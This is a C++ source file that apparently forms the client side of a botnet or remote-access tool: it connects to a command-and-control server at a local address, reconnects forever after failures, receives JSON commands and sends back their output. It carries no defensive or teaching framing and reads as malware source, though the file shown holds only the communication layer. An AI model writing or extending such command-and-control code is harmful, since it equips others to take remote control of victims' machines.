#include <nlohmann/json.hpp>
#include "config.h"
#include "client.h"

void Client::Connect()
{
	boost::asio::ip::address addr = boost::asio::ip::address::from_string("127.0.0.1");
	unsigned short port = 27016;
	tcp::endpoint cnc(addr, port);

	try
	{
		m_sock.connect(cnc);
	}
	catch (boost::system::system_error&)
	{
		m_sock.close();
		Sleep(RECONNECT_TO_CNC_INTERVAL_IN_SECONDS * 1000);
		Connect();
	}
}

void Client::Send(std::string data)
{
	if (data.empty())
		m_sock.send(boost::asio::buffer("No output."));
	m_sock.send(boost::asio::buffer(data));
}

json Client::Receive()
{
	std::string buff;
	buff.resize(1024);
	m_sock.receive(boost::asio::buffer(buff));
	return json::parse(buff);
}
